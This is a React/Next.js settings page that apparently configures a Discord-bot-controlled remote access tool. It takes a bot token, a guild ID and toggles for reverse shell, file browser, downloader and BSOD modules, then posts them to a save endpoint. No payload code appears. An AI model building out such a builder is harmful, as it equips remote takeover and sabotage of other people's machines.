"use client";
import React, { useState } from "react";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import FormComponent from "@/components/custom/FormComponent";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";

// Define a proper Zod schema
const languageSchema = z.object({
  BotData: z.object({
    Language: z.string().min(1, "Language is required").default("template"),
    Token: z.string().default(""),
    GuildID: z.string().default(""),
  }),
  Modules: z.object({
    ReverseShell: z.boolean().default(false),
    FileBrowser: z.boolean().default(false),
    Downloader: z.boolean().default(false),
    BSOD: z.boolean().default(false),
  }),
});

// Infer TypeScript type from schema
export type LanguageSchemaType = z.infer<typeof languageSchema>;

// Create default values using the schema
const defaultValues: LanguageSchemaType = languageSchema.parse({
  BotData: {
    Language: "template",
    Token: "",
    GuildID: "",
  },
  Modules: {
    ReverseShell: false,
    FileBrowser: false,
    Downloader: false,
    BSOD: false,
  },
});

const TemplatePage: React.FC = () => {
  // Initialize the form with zodResolver and default values
  const {
    handleSubmit,
    formState: { errors },
  } = useForm<LanguageSchemaType>({
    resolver: zodResolver(languageSchema),
    defaultValues,
  });

  const [submittedData, setSubmittedData] = useState<LanguageSchemaType | null>(null);
  const [liveData, setLiveData] = useState<LanguageSchemaType>(defaultValues);

  const onSubmit = async (data: LanguageSchemaType) => {
    try {
      console.log("Submitted data:", data);
      // Here we send liveData but you might also want to send 'data'
      const response = await fetch("/api/save-settings", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(liveData),
      });

      if (!response.ok) {
        console.error("Failed to save settings.");
      } else {
        console.log("Settings saved successfully.");
        setSubmittedData(data);
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <FormComponent
      onSubmit={handleSubmit(onSubmit)}
      liveData={liveData}
      setLiveData={setLiveData}
      fields={defaultValues}
    />
  );
};

export default TemplatePage;
